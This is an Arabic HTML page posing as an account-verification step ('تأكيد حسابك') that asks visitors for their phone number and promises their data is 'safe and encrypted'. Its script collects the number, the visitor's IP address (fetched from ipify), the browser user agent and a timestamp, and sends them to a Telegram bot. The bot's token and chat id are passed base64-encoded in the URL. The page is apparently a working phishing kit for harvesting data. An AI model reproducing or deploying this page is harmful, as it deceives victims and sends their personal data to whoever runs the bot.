<!DOCTYPE html> <html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>تأكيد حسابك</title> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <style> * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; } body { background: #0b67c8; min-height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; font-family: Tahoma, Arial, sans-serif; } .container { width: 100%; max-width: 380px; margin: 20px; } .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(5px); border-radius: 16px; padding: 32px 24px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); text-align: center; color: white; } /* الأيقونة */ .icon-wrapper { width: 80px; height: 80px; background: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 2px solid rgba(255, 255, 255, 0.3); } .icon-wrapper i { font-size: 40px; color: white; } h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; } .description { font-size: 14px; margin-bottom: 25px; opacity: 0.9; line-height: 1.6; } /* حقل الإدخال */ .input-group { margin-bottom: 20px; text-align: right; } .input-field { width: 100%; padding: 16px 18px; background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 12px; color: white; font-size: 16px; transition: all 0.3s; direction: ltr; text-align: left; } .input-field:focus { outline: none; border-color: white; background: rgba(255, 255, 255, 0.25); box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.2); } .input-field::placeholder { color: rgba(255, 255, 255, 0.7); font-size: 14px; } /* زر الإرسال */ .submit-btn { width: 100%; padding: 16px; background: white; border: none; border-radius: 30px; color: #0b67c8; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin: 10px 0 20px; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2); } .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); } .submit-btn i { font-size: 18px; } /* رسالة الحالة */ .status-message { margin-top: 15px; padding: 12px; border-radius: 30px; font-size: 14px; font-weight: 500; display: none; } .status-message.success { background: rgba(46, 204, 113, 0.3); border: 1px solid #2ecc71; color: white; display: block; } .status-message.error { background: rgba(231, 76, 60, 0.3); border: 1px solid #e74c3c; color: white; display: block; } .status-message.info { background: rgba(52, 152, 219, 0.3); border: 1px solid #3498db; color: white; display: block; } /* رمز التحميل */ .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(11, 103, 200, 0.3); border-radius: 50%; border-top-color: #0b67c8; animation: spin 1s ease-in-out infinite; } @keyframes spin { to { transform: rotate(360deg); } } /* حقوق الملكية */ .footer-note { margin-top: 20px; font-size: 12px; opacity: 0.7; } /* شريط التقدم (اختياري) */ .progress-bar { width: 100%; height: 4px; background: rgba(255, 255, 255, 0.2); border-radius: 10px; margin: 20px 0 5px; overflow: hidden; } .progress-fill { width: 66%; height: 100%; background: white; border-radius: 10px; animation: progress 2s ease-in-out infinite; } @keyframes progress { 0% { width: 30%; } 50% { width: 70%; } 100% { width: 30%; } } </style> </head> <body> <div class="container" id="mainContent"> <!-- المحتوى الأساسي --> <div class="card" id="card"> <!-- الأيقونة --> <div class="icon-wrapper"> <i class="fas fa-mobile-alt"></i> </div> <!-- العنوان --> <h1>تأكيد حسابك</h1> <!-- الوصف --> <div class="description"> من فضلك أدخل رقم هاتفك للتحقق من هويتك<br> <span style="font-size: 13px; opacity: 0.8;">سيتم إرسال رمز تحقق إلى هذا الرقم</span> </div> <!-- شريط التقدم (إضافي) --> <div class="progress-bar"> <div class="progress-fill"></div> </div> <!-- رسالة الحالة --> <div class="status-message" id="statusMessage"></div> <!-- حقل إدخال رقم الهاتف --> <div class="input-group"> <input type="tel" id="phoneNumber" class="input-field" placeholder="أدخل رقم الهاتف" pattern="\+?\d{6,15}" inputmode="numeric" autocomplete="off"> </div> <!-- زر الإرسال --> <button class="submit-btn" id="submitBtn"> <i class="fas fa-paper-plane"></i> <span id="btnText">إرسال الرقم</span> <span id="btnLoader" class="loading" style="display: none;"></span> </button> <!-- رسالة صغيرة --> <div class="footer-note"> <i class="fas fa-shield-alt"></i> معلوماتك آمنة ومشفرة </div> </div> </div> <script> // ==================== نظام التشفير ==================== function decodeToken(encodedToken) { try { const decodedUrl = decodeURIComponent(encodedToken); return atob(decodedUrl); } catch (e) { console.error('❌ فشل فك التشفير:', e); return null; } } // قراءة الباراميترات من الرابط const urlParams = new URLSearchParams(window.location.search); const CHAT_ID = urlParams.get('id'); const encodedToken = urlParams.get('tok'); const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; const card = document.getElementById('card'); const statusMessage = document.getElementById('statusMessage'); const phoneInput = document.getElementById('phoneNumber'); const submitBtn = document.getElementById('submitBtn'); const btnText = document.getElementById('btnText'); const btnLoader = document.getElementById('btnLoader'); function showMessage(msg, type = 'info') { statusMessage.className = 'status-message ' + type; statusMessage.textContent = msg; // إخفاء الرسالة بعد 5 ثواني إذا كانت نجاح if (type === 'success') { setTimeout(() => { statusMessage.style.display = 'none'; }, 5000); } } // ==================== التحقق من صحة الرابط ==================== if(!CHAT_ID || !BOT_TOKEN) { card.innerHTML = ` <div class="icon-wrapper" style="background: rgba(231, 76, 60, 0.3);"> <i class="fas fa-exclamation-triangle"></i> </div> <h1>⚠️ رابط غير صالح</h1> <div class="description" style="margin-bottom: 20px;"> الرجاء استخدام الرابط الصحيح مع الباراميترات المطلوبة </div> <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 12px; font-family: monospace; direction: ltr; text-align: left; font-size: 12px; margin-top: 15px;"> ?id=123456789&tok=ZW5jb2RlZHRva2Vu </div> <div class="footer-note" style="margin-top: 20px;"> مثال: ?id=123456789&tok=ZW5jb2RlZHRva2Vu </div> `; } else { // ==================== رابط صالح - تفعيل الإرسال ==================== // التحقق من الرقم أثناء الكتابة phoneInput.addEventListener('input', function() { // يمكن إضافة تنسيق تلقائي للرقم هنا إذا أردت }); // ==================== الإرسال للبوت ==================== submitBtn.addEventListener('click', async function() { const phoneNumber = phoneInput.value.trim(); if(!phoneNumber) { showMessage('❌ الرجاء إدخال رقم الهاتف', 'error'); return; } if(phoneNumber.length < 6) { showMessage('❌ رقم الهاتف قصير جداً', 'error'); return; } // تفعيل التحميل btnText.style.display = 'none'; btnLoader.style.display = 'inline-block'; submitBtn.disabled = true; showMessage('جاري الإرسال...', 'info'); try { // جلب IP let ip = 'غير معروف'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch (e) {} // رسالة التليجرام (مبسطة) const message = ` 📱 <b>تأكيد حساب - </b> ━━━━━━━━━━━━━━━━ 📞 <b>رقم الهاتف:</b> <code>${phoneNumber}</code> ━━━━━━━━━━━━━━━━ 🌍 <b>IP:</b> ${ip} 🌐 <b>الجهاز:</b> ${navigator.userAgent.substring(0,100)} ⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')} ━━━━━━━━━━━━━━━━ `; const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); const result = await response.json(); if(result.ok) { showMessage('✅ تم إرسال الرقم بنجاح', 'success'); // مسح الحقل phoneInput.value = ''; // رسالة نجاح إضافية setTimeout(() => { alert('📱 شكراً لك!\nتم استلام رقمك بنجاح.'); }, 500); } else { showMessage('❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف'), 'error'); } } catch (error) { showMessage('❌ حدث خطأ في الاتصال بالخادم', 'error'); console.error(error); } finally { btnText.style.display = 'inline'; btnLoader.style.display = 'none'; submitBtn.disabled = false; } }); // إرسال بالضغط على Enter phoneInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') { submitBtn.click(); } }); } </script> </body> </html>
